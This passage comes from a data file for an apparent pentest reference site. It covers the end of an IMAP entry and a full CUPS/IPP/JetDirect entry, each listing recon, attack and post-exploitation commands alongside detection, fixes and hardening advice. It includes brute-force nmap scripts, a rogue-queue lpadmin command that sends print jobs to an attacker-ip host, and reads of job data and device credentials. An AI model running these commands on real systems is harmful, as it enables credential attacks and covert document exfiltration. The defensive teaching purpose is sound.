      { command: "a6 FETCH 1 (BODY[])", description: "Retrieves a message body." },
      { command: "a7 FETCH 1 (BODY[HEADER])", description: "Retrieves the headers of a message." },
      { command: "a8 STORE 1 +FLAGS (\\Seen)", description: "Sets a flag on a message." },
      { command: "openssl s_client -connect <target>:993 -quiet", description: "Opens the implicit TLS session for manual commands." },
      { command: "nmap --script imap-capabilities,imap-brute -p 143 <target>", description: "Fingerprints the server and tests credentials." },
    ],
    hardening: [
      {
        title: "Require TLS for every login",
        detail:
          "Reject the LOGIN command until STARTTLS has completed, and move clients to implicit TLS on port 993 where you can.",
      },
      {
        title: "Lock out and rate limit",
        detail:
          "Enforce a lockout after repeated failures, throttle attempts per source address, and alert on spraying patterns across many accounts.",
      },
      {
        title: "Use modern authentication",
        detail:
          "Support OAuth for modern clients, app-specific passwords for mail clients that need them, and MFA on the webmail path.",
      },
      {
        title: "Scope mailbox access",
        detail:
          "Give each person their own account, apply ACLs to shared mailboxes, and remove access when somebody changes role.",
      },
      {
        title: "Log access patterns",
        detail:
          "Record authentication events and flag bulk FETCH activity, which is what bulk collection looks like in the log.",
      },
      {
        title: "Keep the listener internal",
        detail:
          "Bind the IMAP service to the internal interface and require VPN or conditional access for remote users.",
      },
    ],
    tools: ["nmap", "hydra", "curl", "netcat", "openssl", "thunderbird"],
  },
  {
    slug: "ipp-cups-jetdirect",
    name: "IPP / CUPS / JetDirect",
    port: 631,
    protocol: "tcp",
    risk: "high",
    tags: ["printing", "ipp", "legacy", "network"],
    summary:
      "Print services are surprisingly chatty. The IPP interface on 631 lists printers, queues and job metadata, and the older JetDirect listener on 9100 accepts a print job from anyone. Job names and owners are visible to every client that can reach the queue, which turns the print system into a directory of people and documents. CUPS also has a web administration interface that older releases left wide open, and a printer that accepts jobs from you can be made to send its output somewhere else.",
    connect: [
      {
        label: "IPP client",
        command: "lpstat -h <target> -p",
        detail:
          "The CUPS client tools talk to the print server over IPP. This is the quickest way to see what printers exist.",
      },
      {
        label: "Web interface",
        command: "curl -sI http://<target>:631/ | grep -i -E 'server|location'",
        detail:
          "The CUPS web root usually redirects to the admin interface and its headers carry the CUPS version.",
      },
      {
        label: "Raw JetDirect",
        command: "nc -nv <target> 9100 < job.ps",
        detail:
          "Port 9100 takes raw PostScript with no handshake at all. If the port is open, anyone can send a job to the printer.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 631,9100 <target>",
        detail:
          "Scanning both ports tells you whether the device speaks IPP, raw printing, or both, and the vendor string identifies the printer model.",
      },
      {
        title: "Printer listing over the web",
        command: "curl -s http://<target>:631/printers/",
        detail:
          "The printers directory is often readable without authentication and lists the device names, models and the queues behind them.",
      },
      {
        title: "Version fingerprint",
        command: "curl -sI http://<target>:631/ | grep -i -E '^server:'",
        detail:
          "The Server header gives the CUPS version, which determines whether the admin interface requires authentication and which fixes apply.",
      },
    ],
    enumeration: [
      {
        title: "Job queue listing",
        command: "lpstat -h <target> -t",
        detail:
          "Lists queued jobs with their owner, the document name and the target printer. The document names alone are a useful disclosure.",
      },
      {
        title: "Completed jobs",
        command: "lpstat -h <target> -W completed -o",
        detail:
          "The completed history shows what has been printed and by whom, including on devices where the queue is shared across a department.",
      },
      {
        title: "IPP request test",
        command: "ipptool -tv <target>ipp://<target>:631/ipp/print",
        detail:
          "Sends a standard IPP request and prints the response in full, which is the clearest way to confirm the protocol is really IPP.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated job submission and queue disclosure",
        severity: "medium",
        command: "lpstat -h <target> -t",
        detail:
          "Anonymous users can often list the queue and submit jobs. The listing exposes document names, owners and the volume of work, and a submitted job can be a denial of service against the paper stock.",
        detection:
          "Job submissions from hosts with no corresponding user, and a sudden spike in queue depth.",
        fix:
          "Require authentication for printing, disable guest access and restrict submission to the groups that need it.",
      },
      {
        title: "Weak credentials on the admin interface",
        severity: "high",
        command: "nmap --script http-form-brute --script-args http-form-brute.path=/admin/ -p 631 <target>",
        detail:
          "The CUPS admin interface protects printers, queues and cupsd.conf. On older releases the protection is weak or absent, and gaining it means gaining the ability to add a printer and redirect every job.",
        detection:
          "Authentication failures against the admin path, and configuration changes recorded in the CUPS error log.",
        fix:
          "Require a strong administrator password, keep the admin interface on a management network, and upgrade CUPS to a current release.",
      },
      {
        title: "Adding a rogue printer to the queue",
        severity: "high",
        command: "lpadmin -h <target> -p rogue -v socket://<attacker-ip>:9100 -E -m raw",
        detail:
          "With admin rights you can register a new queue that points at any backend. Users who pick the rogue queue send their documents to you instead of the office printer.",
        detection:
          "New queues appearing in the printer list, and job traffic to a device that is not on the asset list.",
        fix:
          "Restrict who can add printers, publish a list of approved destinations, and monitor the queue list for changes.",
      },
    ],
    postEx: [
      {
        title: "Read queued jobs and their documents",
        severity: "high",
        command: "curl -s http://<target>:631/jobs/1",
        detail:
          "Recent CUPS versions expose job attributes over the web, including the document name, the submitting user and the file path on the server. When job files are retrievable, the content goes with them.",
        detection:
          "Job read requests from hosts that are not the printing client, and a spike in job retrieval.",
        fix:
          "Require authentication for job access, and set the job retention and spool cleanup policy so nothing sits on the disk.",
      },
      {
        title: "Exfiltrate documents through a controlled backend",
        severity: "critical",
        command: "lpadmin -h <target> -p collector -v socket://<attacker-ip>:9100 -E -m raw",
        detail:
          "Once the queue is under your control, print jobs arrive as PostScript or PCL containing the full document. It is a covert exfiltration channel that looks like ordinary printing.",
        detection:
          "Print jobs sent to destinations that are not in the approved device list, and traffic from the print server to unexpected hosts.",
        fix:
          "Do not allow printer registration from user accounts, and restrict outbound traffic from the print server to approved print destinations.",
      },
      {
        title: "Read the printer configuration and device URIs",
        severity: "medium",
        command: "curl -s http://<target>:631/printers/<printer>/",
        detail:
          "The printer attributes include the device URI, which often embeds the SNMP community string or the device credentials used to manage the printer itself.",
        detection:
          "Reads of printer attributes from addresses outside the print server and the administrative workstations.",
        fix:
          "Require authentication for the web interface, and store device credentials in the print server configuration rather than in the device URI.",
      },
    ],
    commands: [
      { command: "lpstat -h <target> -p", description: "Lists the printers known to the server." },
      { command: "lpstat -h <target> -t", description: "Lists the current print queue." },
      { command: "lpstat -h <target> -W completed -o", description: "Lists completed print jobs." },
      { command: "lp -h <target> -d <printer> -t /path/to/file", description: "Submits a print job." },
      { command: "ipptool -tv <target> ipp://<target>:631/ipp/print", description: "Sends a raw IPP request and shows the response." },
      { command: "curl -s http://<target>:631/printers/", description: "Reads the printer directory over the web." },
      { command: "curl -s http://<target>:631/jobs/1", description: "Reads the attributes of a print job." },
      { command: "curl -sI http://<target>:631/", description: "Prints the CUPS banner and version." },
      { command: "lpadmin -h <target> -p <name> -v socket://<ip>:9100 -E", description: "Registers a printer with a backend." },
      { command: "nc -nv <target> 9100 < job.ps", description: "Sends a raw job to the JetDirect port." },
    ],
    hardening: [
      {
        title: "Require authentication for printing",
        detail:
          "Turn off guest and anonymous access, require every submitter to authenticate, and restrict the queue to the groups that need it.",
      },
      {
        title: "Segment the print network",
        detail:
          "Put printers on their own VLAN and allow only the print server to reach them. Users should print through the server, not to the device.",
      },
      {
        title: "Protect the interfaces",
        detail:
          "Use IPP with TLS, disable the plain IPP listener, and block the raw JetDirect port from the user network with a firewall.",
      },
      {
        title: "Harden the device itself",
        detail:
          "Change the printer admin password, replace the default SNMP community string, and keep the firmware current on every device.",
      },
      {
        title: "Control what the server can reach",
        detail:
          "Egress filter the print server so it can only talk to approved print destinations. That stops the collector queue from ever working.",
      },
      {
        title: "Clean up and monitor",
        detail:
          "Set a short job retention, purge the spool directory regularly, and log who prints what so unusual destinations stand out.",
      },
    ],
    tools: ["nmap", "curl", "netcat", "lpstat", "ipptool", "hydra"],
  },
];
